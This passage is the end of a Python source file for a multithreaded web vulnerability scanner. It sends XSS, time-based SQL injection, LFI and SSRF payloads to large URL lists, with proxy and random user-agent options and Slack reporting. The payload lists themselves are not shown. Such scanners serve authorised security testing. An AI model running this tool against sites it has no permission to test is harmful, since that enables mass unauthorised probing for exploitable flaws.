                    scan_url(url, payload_generator, timeout, delay, debug, effective_proxy, attack_type,
                             custom_headers, output_manager, use_random_agent, custom_user_agent,
                             socks_proxy_already_set=socks_proxy_set)

                except Exception as e:
                    if debug:
                        write_output(f"Error processing URL {url}: {str(e)}\n", output_manager=output_manager)

                # Update progress and mark task as done
                with progress_lock:
                    progress += 1
                queue.task_done()

                # Check stop_event before next iteration
                if stop_event.is_set():
                    break

            except Exception as e:
                if debug:
                    write_output(f"Worker error: {str(e)}\n", output_manager=output_manager)
                # Continue to next URL
                continue
    finally:
        # Do NOT reset the proxy in each worker - it's managed globally
        if debug:
            write_output(f"DEBUG: Worker thread exiting\n", output_manager=output_manager)


def timeout_monitor(attack_type, start_time, attack_timeout, stop_event, output_manager, debug):
    """
    A dedicated thread to monitor timeout and forcefully stop operations
    when the timeout is reached.
    """
    # Convert timeout to seconds for comparison
    timeout_seconds = attack_timeout * 3600

    # Loop until timeout or until stop_event is set
    while not stop_event.is_set():
        elapsed = time.time() - start_time

        # Log status every 10 minutes if debug is enabled
        if debug and int(elapsed) % 600 < 1:  # This will trigger approximately once every 10 minutes
            remaining = timeout_seconds - elapsed
            hours_remaining = int(remaining // 3600)
            minutes_remaining = int((remaining % 3600) // 60)
            write_output(
                f"DEBUG: {attack_type} scan running for {int(elapsed // 60)} minutes. "
                f"Timeout in {hours_remaining}h {minutes_remaining}m.\n",
                output_manager=output_manager
            )

        # Check if timeout has been reached
        if elapsed >= timeout_seconds:
            write_output(
                f"\nTimeout reached for {attack_type} scan after {attack_timeout} hours. "
                f"Forcing stop.\n",
                output_manager=output_manager
            )
            # Set the stop event to signal all threads to stop
            stop_event.set()
            return

        # Sleep for a short time before checking again
        time.sleep(5)  # Check every 5 seconds


def start_attack_with_timeout(queue, payloads, timeout, delay, debug, proxy, attack_type, custom_headers,
                              output_manager, use_random_agent, custom_user_agent, attack_timeout_hours, args):
    global timeout_reached

    # Reset the timeout flag
    timeout_reached = False
    # Create a stop event to signal threads to stop
    stop_event = threading.Event()
    # Record the start time for monitoring
    start_time = time.time()
    # Start the timeout monitor in a separate thread
    timeout_thread = threading.Thread(
        target=timeout_monitor,
        args=(attack_type, start_time, attack_timeout_hours, stop_event, output_manager, debug),
        daemon=True
    )
    timeout_thread.start()

    # Start the worker threads
    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(
            target=worker,
            args=(queue, payloads, timeout, delay, debug, proxy, attack_type, custom_headers,
                  output_manager, use_random_agent, custom_user_agent, stop_event),
            daemon=True
        )
        thread.start()
        threads.append(thread)

    # Wait for either completion or interruption
    try:
        # Wait until the queue is empty
        while not queue.empty():
            if stop_event.is_set():
                break
            time.sleep(1)

        # If queue is empty but threads are still working, wait a bit longer
        if not stop_event.is_set():
            wait_time = 0
            max_wait = 30  # Maximum seconds to wait for threads to finish
            while any(t.is_alive() for t in threads) and wait_time < max_wait:
                time.sleep(1)
                wait_time += 1
                if stop_event.is_set():
                    break

    except KeyboardInterrupt:
        write_output("\nScan interrupted by user. Stopping gracefully...\n", output_manager=output_manager)
        stop_event.set()

    # Ensure the stop event is set
    stop_event.set()

    # If the queue is not empty, clear it
    if not queue.empty():
        try:
            write_output(f"\nClearing unprocessed queue items for {attack_type}...\n", output_manager=output_manager)
            while not queue.empty():
                try:
                    queue.get_nowait()
                    queue.task_done()
                except QueueEmpty:
                    break
        except Exception as e:
            if debug:
                write_output(f"Error while clearing queue: {e}\n", output_manager=output_manager)

    # Log completion time
    elapsed = time.time() - start_time
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    seconds = int(elapsed % 60)

    write_output(
        f" {attack_type} scan completed or stopped after {hours}h {minutes}m {seconds}s\n",
        output_manager=output_manager
    )

    # Do NOT reset proxy here - let each thread handle resetting when it finishes
    # This avoids race conditions where one thread resets while others are still working

    # Force garbage collection
    gc.collect()


def progress_thread():
    global progress, total_progress, quiet_mode
    last_progress = 0
    start_time = time.time()

    while progress < total_progress:
        with progress_lock:
            current_progress = progress
            current_total = total_progress

        if not quiet_mode:
            elapsed_time = time.time() - start_time
            if elapsed_time > 0:
                items_per_second = current_progress / elapsed_time
                remaining_items = current_total - current_progress
                eta_seconds = remaining_items / items_per_second if items_per_second > 0 else 0

                # Format ETA nicely
                eta_str = ""
                if eta_seconds > 3600:
                    eta_str = f"{int(eta_seconds / 3600)}h {int((eta_seconds % 3600) / 60)}m"
                elif eta_seconds > 60:
                    eta_str = f"{int(eta_seconds / 60)}m {int(eta_seconds % 60)}s"
                else:
                    eta_str = f"{int(eta_seconds)}s"

                # Rate limiting progress updates to avoid console flickering
                if current_progress > last_progress + 10 or elapsed_time > 5:
                    sys.stderr.write(
                        f"\rProgress: [{current_progress}/{current_total}] - {items_per_second:.2f} URLs/sec - ETA: {eta_str}")
                    sys.stderr.flush()
                    last_progress = current_progress
            else:
                sys.stderr.write(f"\rProgress: [{current_progress}/{current_total}]")
                sys.stderr.flush()

        time.sleep(0.5)

    if not quiet_mode:
        elapsed_time = time.time() - start_time
        sys.stderr.write(f"\rProgress: [{total_progress}/{total_progress}] - Completed in {elapsed_time:.2f}s!\n")
        sys.stderr.flush()


def send_slack_message(token, channel, message):
    client = WebClient(token=token)
    try:
        response = client.chat_postMessage(channel=channel, text=message)
        print(f"Message sent: {response['ts']}")
    except SlackApiError as e:
        print(f"Error sending message: {e}")


class PayloadAction(argparse.Action):
    def __init__(self, option_strings, dest=None, nargs=0, default=None, required=False, type=None, metavar=None,
                 help=None):
        super(PayloadAction, self).__init__(option_strings=option_strings, dest=dest, nargs=nargs, default=default,
                                            required=required, type=type, metavar=metavar, help=help)

    def __call__(self, parser, namespace, values, option_string=None):
        if values is None:
            setattr(namespace, self.dest, True)
        else:
            setattr(namespace, self.dest, values)


def load_urls_in_chunks(file_path, chunk_size=10000):
    """Generator function to load URLs from file in chunks"""
    with open(file_path, 'r') as file:
        while True:
            chunk = []
            for _ in range(chunk_size):
                line = file.readline()
                if not line:
                    break
                url = line.strip()
                if url:
                    chunk.append(url)
            if not chunk:
                break
            yield chunk


def count_urls(file_path):
    """Count total URLs in the file without loading all into memory"""
    count = 0
    with open(file_path, 'r') as file:
        for line in file:
            if line.strip():
                count += 1
    return count


def main():
    global total_urls, total_progress, quiet_mode, progress
    global xss_simple_payloads, sql_injection_payloads
    global lfi_payloads, ssrf_payloads, lfi_ssrf_payloads
    global url_chunk_size, global_socks_proxy_enabled, global_socks_proxy_url
    # Start with a clean proxy state
    reset_socks_proxy()

    description = '''
    Memory-Optimized SQL Injection, LFI, SSRF, and XSS Scanner

    Example usage:
    1:  python3 optimized_scanner.py -u urls.txt --xss-simple xss-custom-payloads.txt
        . Uses payloads from the specified file.
    2:  python3 optimized_scanner.py -u urls.txt --lfi-ssrf --sql
    3:  python3 optimized_scanner.py -u urls.txt --sql
        . Scans for time-based SQL injection vulnerabilities

    Advanced options:
    4:  python3 optimized_scanner.py -u urls.txt --xss-simple -o output.txt --chunk-size 5000
        . Processes URLs in smaller chunks to reduce memory usage

    Slack Notifications:
    6:  python3 optimized_scanner.py -u urls.txt --xss-simple -o output.txt --slack-token "xoxb-your-token" --slack-channel "#your-channel"

    Note:
    For SQL injection scanning, the tool checks for time-based blind SQL injection with a 17-second delay
    For large URL files, adjust --chunk-size (default: 1000) to manage memory usage
    '''

    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-u', '--urls', type=str, required=True, metavar='FILE', help='File containing URLs to scan')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode - only show vulnerable URLs')
    parser.add_argument('-t', '--threads', type=int, default=50, metavar='int', help='Number of threads, default=50')
    parser.add_argument('-d', '--delay', type=int, default=50, metavar='MS',
                        help='Delay between requests in milliseconds, default=50')
    parser.add_argument('-H', '--header', action='append', metavar='HEADER',
                        help='Add custom header (can be used multiple times)')
    parser.add_argument('--lfi', action=PayloadAction, nargs='?', metavar='FILE', help='Use LFI payloads.')
    parser.add_argument('--ssrf', action=PayloadAction, nargs='?', metavar='FILE', help='Use SSRF payloads.')
    parser.add_argument('--sql', action=PayloadAction, nargs='?', metavar='FILE',
                        help='Use SQL injection time-based payloads.')
    parser.add_argument('--lfi-ssrf', action=PayloadAction, nargs='?', metavar='FILE',
                        help='Use combined LFI and SSRF payloads.')
    parser.add_argument('--xss-simple', action=PayloadAction, nargs='?', metavar='FILE',
                        help='Use simple XSS payloads, ex: <hello11>')
    parser.add_argument('-o', '--output', type=str, metavar='FILE', help='Output file to save results')
    parser.add_argument('--timeout', type=int, default=31, metavar='SEC', help='Request timeout in seconds, default=31')
    parser.add_argument('--attack-timeout', type=int, default=3, metavar='HOURS',
                        help='Maximum time (in hours) to spend on each attack type, default=3 (3 hours)')
    parser.add_argument('--debug', action='store_true', help='Enable debug info')
    parser.add_argument('-p', '--proxy', type=str, metavar='URL',
                        help='Proxy to use (e.g., http://127.0.0.1:7080, socks4://127.0.0.1:1080, socks5://127.0.0.1:1080, or socks5h://127.0.0.1:1080)')
    parser.add_argument('--random-agent', action='store_true', help='Use a random User-Agent for each url')
    parser.add_argument('--user-agent', type=str, metavar='USER_AGENT', help='Set a specific User-Agent')
    parser.add_argument('--slack-token', type=str, metavar='TOKEN', help='Slack Bot User OAuth Token')
    parser.add_argument('--slack-channel', type=str, metavar='#CHANNEL', help='Slack channel to send notifications to')
    parser.add_argument('--chunk-size', type=int, default=1000, metavar='SIZE',
                        help='Number of URLs to process at once (to manage memory usage), default=1000')
    parser.add_argument('--memory-limit', type=int, default=0, metavar='MB',
                        help='Maximum memory usage in MB (0 = no limit), default=0')

    args = parser.parse_args()

    # Set global variables
    quiet_mode = args.quiet
    url_chunk_size = args.chunk_size

    # Memory limit implementation
    if args.memory_limit > 0:
        try:
            import resource
            # Convert MB to bytes
            memory_limit = args.memory_limit * 1024 * 1024
            resource.setrlimit(resource.RLIMIT_AS, (memory_limit, memory_limit))
            if not quiet_mode:
                print(f"Memory limit set to {args.memory_limit} MB")
        except ImportError:
            print("Warning: resource module not available on this platform, memory limit will not be enforced")
        except Exception as e:
            print(f"Warning: Failed to set memory limit: {e}")

    with OutputFileManager(args.output) as output_manager:
        if not (args.lfi or args.ssrf or args.xss_simple or args.lfi_ssrf or args.sql):
            print("Please specify at least one payload type: --sql-slow, --sql-fast, --lfi, " +
                  "--ssrf, --xss-simple, --lfi-ssrf")
            return

        if args.proxy and args.proxy.startswith(('socks4://', 'socks5://', 'socks5h://')):
            try:
                set_socks_proxy(args.proxy)
                if args.debug:
                    print(f"DEBUG: Global SOCKS proxy configured: {args.proxy}")
            except Exception as e:
                if args.debug:
                    print(f"DEBUG: Error setting up global SOCKS proxy: {str(e)}")

        # Count total URLs without loading them all into memory
        total_urls = count_urls(args.urls)

        # Calculate total number of scans to be performed
        scan_types_count = sum([bool(args.xss_simple), bool(args.lfi),
                                bool(args.ssrf), bool(args.lfi_ssrf), bool(args.sql)])

        total_progress = total_urls * scan_types_count
        progress = 0

        if not quiet_mode:
            print(
                f"Starting scan of {total_urls} URLs with {scan_types_count} attack types (total operations: {total_progress})")

        # Start progress tracking thread
        threading.Thread(target=progress_thread, daemon=True).start()

        # Initialize payload generators
        payload_generators = {}

        if args.xss_simple:
            if isinstance(args.xss_simple, str):
                payload_generators['xssSimple'] = PayloadGenerator(file_path=args.xss_simple)
            else:
                payload_generators['xssSimple'] = PayloadGenerator(payloads=xss_simple_payloads)

        if args.sql:
            if isinstance(args.sql, str):
                payload_generators['sql'] = PayloadGenerator(file_path=args.sql)
            else:
                payload_generators['sql'] = PayloadGenerator(payloads=sql_injection_payloads)

        if args.lfi:
            if isinstance(args.lfi, str):
                payload_generators['lfi'] = PayloadGenerator(file_path=args.lfi)
            else:
                payload_generators['lfi'] = PayloadGenerator(payloads=lfi_payloads)

        if args.ssrf:
            if isinstance(args.ssrf, str):
                payload_generators['ssrf'] = PayloadGenerator(file_path=args.ssrf)
            else:
                payload_generators['ssrf'] = PayloadGenerator(payloads=ssrf_payloads)


        if args.lfi_ssrf:
            if isinstance(args.lfi_ssrf, str):
                payload_generators['lfi-ssrf'] = PayloadGenerator(file_path=args.lfi_ssrf)
            else:
                # Combine LFI and SSRF payloads
                combined_payloads = lfi_payloads + ssrf_payloads
                payload_generators['lfi-ssrf'] = PayloadGenerator(payloads=combined_payloads)


        # Define attack order - can be customized based on priority
        attack_types = []
        if args.xss_simple:
            attack_types.append(('xssSimple', 15))
        if args.ssrf:
            attack_types.append(('ssrf', 15))
        if args.lfi:
            attack_types.append(('lfi', 15))
        if args.lfi_ssrf:
            attack_types.append(('lfi-ssrf', 15))
        if args.sql:
            attack_types.append(('sql', 30))  # Higher timeout for SQL injection tests



        # Parse custom headers
        custom_headers = {}
        custom_user_agent = args.user_agent
        if args.header:
            for header in args.header:
                parts = header.split(':', 1)
                if len(parts) == 2:
                    key, value = parts
                    key = key.strip()
                    value = value.strip()
                    custom_headers[key] = value
                    if key.lower() == 'user-agent':
                        custom_user_agent = value
                else:
                    print(f"Warning: Ignoring malformed header: {header}")

        # Process URLs in chunks for each attack type
        for attack_type, timeout in attack_types:
            # Reset socket if a previous attack used SOCKS - only once at the beginning of each attack type
            if args.debug:  # Use args.debug instead of global debug variable
                write_output(f"DEBUG: SOCKS proxy reset before starting {attack_type} scan\n",
                             output_manager=output_manager)

            progress_prefix = f"Running {attack_type} scan"
            if not quiet_mode:
                print(f"\n{progress_prefix}...")

            # Get payload generator for this attack type
            payload_generator = payload_generators.get(attack_type)
            if not payload_generator:
                print(f"Error: No payloads found for {attack_type}")
                continue

            # Log the start time for this attack type
            attack_start_time = time.time()
            if not quiet_mode:
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f"Starting {attack_type} scan at {current_time}")
                print(f"Attack timeout set to {args.attack_timeout} hours")

            # Process URL file in chunks
            for chunk_index, url_chunk in enumerate(load_urls_in_chunks(args.urls, args.chunk_size)):
                # Check if the total attack time has already exceeded the limit
                if (time.time() - attack_start_time) > (args.attack_timeout * 3600):
                    if not quiet_mode:
                        print(f"Attack timeout reached for {attack_type} before processing chunk {chunk_index + 1}")
                    break

                if not quiet_mode:
                    chunk_info = f"Processing chunk {chunk_index + 1} ({len(url_chunk)} URLs)"
                    elapsed_minutes = (time.time() - attack_start_time) / 60
                    print(f"{progress_prefix}: {chunk_info} - {elapsed_minutes:.1f} minutes elapsed")

                # Create a queue with size limit for this chunk to prevent memory issues
                queue = Queue(maxsize=min(1000, len(url_chunk)))
                for url in url_chunk:
                    queue.put(url)

                # Calculate remaining time for this attack type
                elapsed_seconds = time.time() - attack_start_time
                remaining_hours = max(0, args.attack_timeout - (elapsed_seconds / 3600))

                # Start attack for this chunk
                start_attack_with_timeout(
                    queue, payload_generator, timeout, args.delay, args.debug, args.proxy,
                    attack_type, custom_headers, output_manager, args.random_agent,
                    custom_user_agent, remaining_hours, args
                )

                # Check if we've already exceeded the timeout
                if (time.time() - attack_start_time) > (args.attack_timeout * 3600):
                    if not quiet_mode:
                        print(f"Attack timeout reached for {attack_type} after chunk {chunk_index + 1}")
                    break

                # Force garbage collection between chunks
                gc.collect()



            # Log completion of this attack type
            attack_elapsed_time = time.time() - attack_start_time
            attack_elapsed_hours = attack_elapsed_time / 3600
            if not quiet_mode:
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f" Completed {attack_type} scan at {current_time} - took {attack_elapsed_hours:.2f} hours")

        if global_socks_proxy_enabled:
            reset_socks_proxy()
            if args.debug:
                print(f"DEBUG: Global SOCKS proxy reset at end of scan")

        # Define Saudi Arabia timezone for timestamps
        saudi_tz = pytz.timezone("Asia/Riyadh")

        # Get current time in Saudi Arabia
        timestamp = datetime.now(saudi_tz).strftime('%Y-%m-%d %H:%M:%S')

        completion_message = f"\nScanning completed on {timestamp}\n"
        write_output(completion_message, output_manager=output_manager)

        if args.slack_token and args.slack_channel:
            result_summary = f"Scanning completed on {timestamp}"
            if args.output:
                result_summary += f" Full results saved to {args.output}. "

            if not quiet_mode:
                result_summary += "Here's a summary of the vulnerabilities found (without URLs):\n\n"
                for vulnerability_key in reported_vulnerabilities:
                    payload, reflection_type, status_message = vulnerability_key.split('|||')
                    result_summary += f"- {reflection_type}\n  Payload: {payload}\n  {status_message}\n\n"
            else:
                result_summary += "Vulnerable URLs have been identified and saved."

            send_slack_message(args.slack_token, args.slack_channel, result_summary)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        # Make sure to reset proxy on keyboard interrupt
        if global_socks_proxy_enabled:
            reset_socks_proxy()
            print("Global SOCKS proxy reset after interrupt")
    except MemoryError:
        print("\n\nERROR: Out of memory!")
        print("Try using a smaller --chunk-size value or set a --memory-limit")
    except Exception as e:
        print(f"\n\nERROR: An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
        # Make sure to reset proxy on any exception
        if global_socks_proxy_enabled:
            reset_socks_proxy()
            print("Global SOCKS proxy reset after error")
